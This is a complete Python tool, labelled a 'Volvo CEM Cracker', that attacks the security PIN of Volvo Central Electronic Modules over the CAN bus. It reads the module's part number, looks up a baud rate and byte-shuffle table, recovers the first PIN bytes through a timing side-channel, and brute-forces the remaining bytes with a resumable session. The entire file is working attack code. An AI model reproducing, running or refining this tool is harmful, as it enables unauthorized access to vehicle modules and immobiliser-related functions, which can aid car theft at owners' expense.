#!/usr/bin/env python3
import can
import time
import struct
import math
import random
import sys
import os
import json

# --- CONFIGURATION & CONSTANTS ---

REQ_ID = 0x000FFFFE  # Extended ID for requests
CEM_HS_ID = 0x50     # High Speed CEM Node ID
CEM_LS_ID = 0x40     # Low Speed CEM Node ID

CMD_UNLOCK = 0xBE
CMD_UNLOCK_REPLY = 0xB9

# PIN Shuffling Patterns (from .ino)
# Indexes into the raw PIN array [P0, P1, P2, P3, P4, P5]
SHUFFLE_ORDERS = [
    [0, 1, 2, 3, 4, 5],
    [3, 1, 5, 0, 2, 4],
    [5, 2, 1, 4, 0, 3],
    [2, 4, 5, 0, 3, 1]
]

# Known CEM Configurations (P/N -> (Baud, ShuffleIndex))
BAUD_500K = 500000
BAUD_250K = 250000

CEM_PARAMS = {
    # P1
    8690719: (BAUD_500K, 0), 8690720: (BAUD_500K, 0), 8690721: (BAUD_500K, 0),
    8690722: (BAUD_500K, 0), 30765471: (BAUD_500K, 0), 30728906: (BAUD_500K, 0),
    30765015: (BAUD_500K, 0), 31254317: (BAUD_500K, 0), 31327215: (BAUD_500K, 3),
    31254749: (BAUD_500K, 3), 31254903: (BAUD_500K, 0), 31296881: (BAUD_500K, 3),
    
    # P2 CEM-B (Brick 1999-2004)
    8645716: (BAUD_250K, 0), 8645719: (BAUD_250K, 0), 8688434: (BAUD_250K, 0),
    8688436: (BAUD_250K, 0), 8688513: (BAUD_250K, 2), 30657629: (BAUD_250K, 0),
    9494336: (BAUD_250K, 0), 9494594: (BAUD_250K, 0), 8645171: (BAUD_250K, 0),
    9452553: (BAUD_250K, 0), 8645205: (BAUD_250K, 0), 9452596: (BAUD_250K, 0),
    8602436: (BAUD_250K, 0), 9469809: (BAUD_250K, 0), 8645200: (BAUD_250K, 0),

    # P2 CEM-L (L shaped 2005-2014)
    30682981: (BAUD_500K, 1), 30682982: (BAUD_500K, 1), 30728356: (BAUD_500K, 1),
    30728542: (BAUD_500K, 1), 30765149: (BAUD_500K, 1), 30765646: (BAUD_500K, 1),
    30786475: (BAUD_500K, 1), 30786889: (BAUD_500K, 1), 31282457: (BAUD_500K, 1),
    31314468: (BAUD_500K, 1), 31394158: (BAUD_500K, 1),

    # P2 CEM-H (L shaped H marked 2005-2008)
    30786476: (BAUD_500K, 1), 30728539: (BAUD_500K, 1), 30728357: (BAUD_500K, 1),
    30765148: (BAUD_500K, 1), 30765643: (BAUD_500K, 1), 30795115: (BAUD_500K, 1),
    31282455: (BAUD_500K, 1), 31394157: (BAUD_500K, 1), 30786579: (BAUD_500K, 1),
    30786890: (BAUD_500K, 1) 
}

LOG_FILE = "crack.log"
SESSION_FILE = "session.json"

# Pre-calculate BCD table for 0-99
BCD_TABLE = [((val // 10) << 4) | (val % 10) for val in range(100)]

def log(msg):
    print(msg)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(msg + "\n")
    except:
        pass

def bcd_to_bin(val):
    return ((val >> 4) * 10) + (val & 0x0F)

def bin_to_bcd(val):
    # Use lookup if in range, else calc
    if 0 <= val < 100:
        return BCD_TABLE[val]
    return ((val // 10) << 4) | (val % 10)


class VolvoCracker:
    def __init__(self, channel='can0'):
        self.channel = channel
        self.bus = None
        self.cem_pn = 0
        self.baud = 500000
        self.shuffle = SHUFFLE_ORDERS[0]
        self.cem_id = CEM_HS_ID 
        
        # Optimization: Pre-allocate reusable message
        self.tx_msg = can.Message(
            arbitration_id=REQ_ID, 
            data=[0]*8,
            is_extended_id=True,
            check=False # Disable some safety checks for speed
        )

    def setup_can(self, bitrate):
        if self.bus:
            self.bus.shutdown()
        
        print(f"Initializing CAN on {self.channel} @ {bitrate}...")
        try:
            # Add filters to ignore noise
            filters = [
                {"can_id": 0x00000003, "can_mask": 0x1FFFFFFF, "extended": True}, # HS Reply
                {"can_id": 0x00000005, "can_mask": 0x1FFFFFFF, "extended": True}, # LS Reply
                {"can_id": 0x03, "can_mask": 0x7FF, "extended": False},           # Std ID Reply?
            ]
            
            self.bus = can.interface.Bus(
                channel=self.channel, 
                bustype='socketcan',
                bitrate=bitrate,
                can_filters=filters
            )
            self.baud = bitrate
            return True
        except Exception as e:
            print(f"Error initializing CAN: {e}")
            return False

    def send_msg(self, arbitration_id, data, is_extended=False):
        # Helper for non-critical messages
        msg = can.Message(arbitration_id=arbitration_id, data=data, is_extended_id=is_extended)
        try:
            self.bus.send(msg)
            return time.time()
        except can.CanError as e:
            print(f"Send Error: {e}")
            return None

    def read_part_number(self):
        """Attempts to read CEM Part Number."""
        # Need to temporarily disable filters or add broadcast filter?
        # For simplicity, we just rely on the existing filters catching the reply (usually 0x00000003)
        
        target_ids = [CEM_HS_ID, CEM_LS_ID]
        
        for tid in target_ids:
            print(f"Attempting to read P/N from Node {hex(tid)}...")
            req = [0xCB, tid, 0xB9, 0xF0, 0x00, 0x00, 0x00, 0x00]
            
            for _ in range(3):
                # Drain
                while self.bus.recv(timeout=0): pass
                
                self.send_msg(REQ_ID, req, is_extended=True)
                
                start = time.time()
                frames = {}
                
                while time.time() - start < 1.0:
                    msg = self.bus.recv(timeout=0.1)
                    if not msg: continue
                    
                    d = msg.data
                    if not d: continue

                    if d[0] & 0x80: 
                        frames[0] = d
                    elif (d[0] & 0x40) == 0: 
                        frames[1] = d
                        
                    if 0 in frames and 1 in frames:
                        f0 = frames[0]
                        f1 = frames[1]
                        
                        pn = 0
                        pn = (pn * 100) + bcd_to_bin(f0[5])
                        pn = (pn * 100) + bcd_to_bin(f0[6])
                        pn = (pn * 100) + bcd_to_bin(f0[7])
                        pn = (pn * 100) + bcd_to_bin(f1[1])
                        
                        print(f"Found Part Number: {pn}")
                        return pn
        return None

    def configure_for_cem(self, pn):
        if pn in CEM_PARAMS:
            baud, shuff_idx = CEM_PARAMS[pn]
            self.baud = baud
            self.shuffle = SHUFFLE_ORDERS[shuff_idx]
            print(f"CEM Configuration: Baud={baud}, Shuffle Index={shuff_idx}")
            return True
        else:
            print(f"Unknown CEM Part Number: {pn}. Defaulting to P1 settings (500k, Shuffle 0).")
            self.baud = 500000
            self.shuffle = SHUFFLE_ORDERS[0]
            return False

    def unlock_attempt_fast(self, pin_bytes):
        """
        Optimized unlock attempt for Brute Force.
        Returns: True if success, False otherwise.
        """
        # Update reusable message data in place
        d = self.tx_msg.data
        d[0] = self.cem_id
        d[1] = CMD_UNLOCK
        
        # Apply shuffle
        # Unroll loop for speed? 6 iters is small but Python overhead is high.
        # shuffle is a list, e.g. [0, 1, 2, 3, 4, 5]
        s = self.shuffle
        d[2 + s[0]] = pin_bytes[0]
        d[2 + s[1]] = pin_bytes[1]
        d[2 + s[2]] = pin_bytes[2]
        d[2 + s[3]] = pin_bytes[3]
        d[2 + s[4]] = pin_bytes[4]
        d[2 + s[5]] = pin_bytes[5]
        
        # Drain buffer? No, relying on filters to keep it clean.
        # If we drain every time, we waste time. 
        # But if we don't drain, we might read an old message.
        # Since we are request-response, the buffer should be empty unless we timed out previously.
        # Compromise: Drain only if we suspect debris? 
        # For max speed, we assume sync.
        
        try:
            self.bus.send(self.tx_msg)
        except can.CanError:
            return False

        # Wait for reply
        # Reduced timeout to 10ms (0.01)
        msg = self.bus.recv(timeout=0.01)
        
        if msg:
            # Filters ensure we only get relevant IDs. Check content.
            # Reply: [CEM_ID, 0xB9, 0x00...]
            if len(msg.data) > 2 and msg.data[1] == CMD_UNLOCK_REPLY and msg.data[2] == 0x00:
                return True
                
        return False

    def unlock_attempt_timing(self, pin_bytes):
        """
        Unlock attempt with timing measurement.
        Returns: (success, latency)
        """
        # Re-use logic but with timestamps
        d = self.tx_msg.data
        d[0] = self.cem_id
        d[1] = CMD_UNLOCK
        s = self.shuffle
        for i in range(6): d[2 + s[i]] = pin_bytes[i]
        
        while self.bus.recv(timeout=0): pass # Drain for precision
        
        try:
            self.bus.send(self.tx_msg)
            t_send = time.time()
        except can.CanError:
            return False, 0

        # Wait longer for timing attack to ensure we catch it? 
        # The latency is the key.
        start = time.time()
        while time.time() - start < 0.1:
            rx = self.bus.recv(timeout=0.02)
            if rx and len(rx.data) > 2 and rx.data[0] == self.cem_id:
                t_recv = rx.timestamp or time.time()
                if rx.data[1] == CMD_UNLOCK_REPLY and rx.data[2] == 0x00:
                    return True, t_recv - t_send
                return False, t_recv - t_send # Return latency even on failure
        
        return False, 0

    def crack_timing(self, known_bytes=0):
        """Attempt to find the first few bytes using timing analysis."""
        print(f"Starting Timing Attack for first 3 bytes...")
        current_pin = [0]*6
        
        for pos in range(known_bytes, 3):
            print(f"Analyzing PIN byte {pos}...")
            stats = {}
            SAMPLES = 20
            
            for b_val_int in range(100):
                b_val = BCD_TABLE[b_val_int]
                current_pin[pos] = b_val
                total_lat = 0
                valid_samples = 0
                
                for _ in range(SAMPLES):
                    if pos + 1 < 6:
                        current_pin[pos+1] = BCD_TABLE[random.randint(0, 99)]
                    
                    suc, lat = self.unlock_attempt_timing(current_pin)
                    if suc:
                        print(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
                        return current_pin
                    if lat > 0:
                        total_lat += lat
                        valid_samples += 1
                
                if valid_samples > 0:
                    stats[b_val] = total_lat / valid_samples
            
            sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
            if not sorted_candidates:
                print("Timing attack failed. Aborting.")
                return None
                
            best_byte = sorted_candidates[0][0]
            print(f"Byte {pos} Match: {hex(best_byte)} (Lat: {sorted_candidates[0][1]*1000:.3f}ms)")
            current_pin[pos] = best_byte
            if pos + 1 < 6: current_pin[pos+1] = 0

        return current_pin

    def save_session(self, index, fixed_bytes):
        try:
            state = {
                "timestamp": time.time(),
                "index": index,
                "fixed_bytes": fixed_bytes
            }
            tmp_file = SESSION_FILE + ".tmp"
            with open(tmp_file, "w") as f:
                json.dump(state, f)
            os.replace(tmp_file, SESSION_FILE)
        except Exception as e:
            pass

    def load_session(self):
        if not os.path.exists(SESSION_FILE):
            return None, None
        try:
            with open(SESSION_FILE, "r") as f:
                state = json.load(f)
            idx = state.get("index", 0)
            fixed = state.get("fixed_bytes", [0]*6)
            return max(0, idx - 500), fixed
        except:
            return None, None

    def brute_force(self, start_pin, start_index=0):
        print(f"Starting Brute Force from index {start_index}...")
        
        # Pre-convert fixed bytes to ensure they are ints (if loaded from JSON)
        # start_pin might be [0x12, 0x34, 0x56, 0, 0, 0]
        # We assume bytes 0,1,2 are fixed.
        
        # Use a bytearray or list for mutable PIN to avoid allocation
        # But we need BCD values.
        current_pin = list(start_pin)
        
        total = 1000000
        start_t = time.time()
        
        # Reduce save frequency
        SAVE_INTERVAL = 2000 
        
        for i in range(start_index, total):
            # Optimized math using lookup table
            # i = 0..999999
            # b3 = (i / 10000) % 100
            # b4 = (i / 100) % 100
            # b5 = i % 100
            
            # Use divmod for speed?
            rem = i
            d1, rem = divmod(rem, 10000)
            d2, d3 = divmod(rem, 100)
            
            current_pin[3] = BCD_TABLE[d1]
            current_pin[4] = BCD_TABLE[d2]
            current_pin[5] = BCD_TABLE[d3]
            
            if i % SAVE_INTERVAL == 0:
                elapsed = time.time() - start_t
                rate = (i - start_index) / elapsed if elapsed > 0 else 0
                remaining = total - i
                eta = remaining / rate if rate > 0 else 0
                print(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - PIN: {current_pin}")
                self.save_session(i, start_pin)
            
            if self.unlock_attempt_fast(current_pin):
                print(f"\n!!! FOUND PIN: {current_pin} !!!")
                if os.path.exists(SESSION_FILE): os.remove(SESSION_FILE)
                return current_pin
                
        return None

    def run(self):
        print("--- Volvo CEM Cracker (Pi Port Optimized) ---")
        if not self.setup_can(500000):
            return
            
        pn = self.read_part_number()
        if pn: self.configure_for_cem(pn)
        else: print("Using Defaults.")
        
        resume_index, resume_fixed_bytes = self.load_session()
        
        if resume_index is not None:
            print("Resuming...")
            partial_pin = [int(x) for x in resume_fixed_bytes]
            start_idx = resume_index
            self.brute_force(partial_pin, start_index=start_idx)
        else:
            print("New Session.")
            partial_pin = self.crack_timing(known_bytes=0) or [0]*6
            self.brute_force(partial_pin, start_index=0)
        
        print("Done.")

if __name__ == "__main__":
    VolvoCracker().run()